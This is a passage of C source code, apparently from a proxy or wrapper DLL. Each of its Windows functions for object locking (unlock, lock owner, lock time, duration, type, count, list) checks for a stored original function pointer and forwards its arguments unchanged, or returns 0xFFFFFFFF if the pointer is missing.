    if (!g_OriginalFunctions.pfnAUTUnlockObject) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTUnlockObject(a1, a2, a3);
}

DWORD WINAPI AUTIsObjectLocked(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTIsObjectLocked) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTIsObjectLocked(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectLockOwner(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectLockOwner) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectLockOwner(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectLockTime(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectLockTime) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectLockTime(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectLockDuration(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectLockDuration) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectLockDuration(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectLockDuration(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectLockDuration) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectLockDuration(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectLockType(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectLockType) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectLockType(a1, a2, a3, a4);
}

DWORD WINAPI AUTSetObjectLockType(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTSetObjectLockType) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTSetObjectLockType(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectLockCount(DWORD a1, DWORD a2, DWORD a3, DWORD a4) {
    if (!g_OriginalFunctions.pfnAUTGetObjectLockCount) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectLockCount(a1, a2, a3, a4);
}

DWORD WINAPI AUTGetObjectLockList(DWORD a1, DWORD a2, DWORD a3, DWORD a4, DWORD a5) {
    if (!g_OriginalFunctions.pfnAUTGetObjectLockList) {
        return 0xFFFFFFFF;
    }
    return g_OriginalFunctions.pfnAUTGetObjectLockList(a1, a2, a3, a4, a5);
}
